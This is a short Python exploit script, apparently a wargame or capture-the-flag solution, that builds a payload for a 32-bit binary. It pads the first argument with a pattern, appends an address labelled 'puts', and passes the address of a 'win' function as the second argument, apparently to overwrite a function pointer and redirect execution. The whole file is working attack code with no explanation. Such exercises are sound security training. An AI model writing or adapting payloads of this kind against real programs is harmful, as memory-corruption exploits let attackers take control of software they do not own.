#!/usr/bin/env python3
import struct
import sys
from pwnpy.pwn import *

win = struct.pack('I', 0x8048494)
puts = struct.pack('I', 0x8049774)

buf = b''

#First argument
buf += create_pattern(0x5)
buf += puts


#Separator
buf += b' '

#Second argument
buf += win
buf += b'\n'

sys.stdout.buffer.write(buf)
sys.stdout.flush()
